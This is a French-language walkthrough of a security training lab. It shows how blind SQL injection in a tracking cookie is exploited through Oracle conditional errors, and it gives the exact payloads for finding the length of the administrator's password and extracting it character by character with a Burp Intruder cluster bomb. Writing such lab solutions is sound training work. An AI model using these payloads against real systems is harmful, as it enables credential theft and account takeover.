## DESCRIPTION
------------------------------------------------------------------------------------------------------

 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

------------------------------------------------------------------------------------------------------

En testant quelques combinaisons a la suite du TrackingId cookie, on peut s'appercevoir qu'une erreur est renvoyee dans tous les cas a la suite d'une `'`, et disparait avec `''`, signifiant que le serveur reagit aux syntax errors.

On peut verifier que le serveur interprete bien l'injection comme une requete SQL :

```'|| (SELECT '' FROM dual) ||'``` -> 200
```'|| (SELECT '' FROM sdffds) ||'``` -> 500

On passe maintenant au test de conditionnal errors

```
'|| (SELECT CASE WHEN (1=2) THEN to_char(1/0) ELSE NULL END FROM DUAL) ||'
'|| (SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM DUAL) ||'
```

Le premier ne causera pas d'erreur, mais le second en causera du fait de la division par zero.

On peut dorenavant tenter de trouver la taille du mot de passe de l'administrateur en modifiant la condition :

```
'|| (SELECT CASE WHEN (LENGTH(password)>1000) THEN to_char(1/0) ELSE NULL END FROM users WHERE username='administrator') ||'
```

On obtient une reponse 200 OK, tandis que pour une length de 1, on obtient une erreur. En incrementant jusque 20, la taille du mot de passe semble donc etre de 20.

Tentons maintenant quelques tests sur le premier caractere du mot de passe :

```
'|| (SELECT CASE WHEN SUBSTR(password, 1, 1) > 'a' THEN NULL ELSE to_char(1/0) END FROM users WHERE username='administrator') ||'
```
Cette condition est vraie, donc une reponse 200 apparait. L'operateur `<` renvoie quant a lui une erreur.

Il est temps de faire passer la requete a l'`intruder` et d'utiliser un `cluster bomb`

```
'|| (SELECT CASE WHEN SUBSTR(password, ยง1ยง, 1) = 'ยงaยง' THEN NULL ELSE to_char(1/0) END FROM users WHERE username='administrator') ||'
```

On utilise la meme liste que pour le precedent lab pour le premier `Payload set` : une liste de 1 a 20, pour le second, une liste a-z et 0-9.

Une fois le mot de passe trouve, il suffit de se connecter en administration afin de terminer le lab.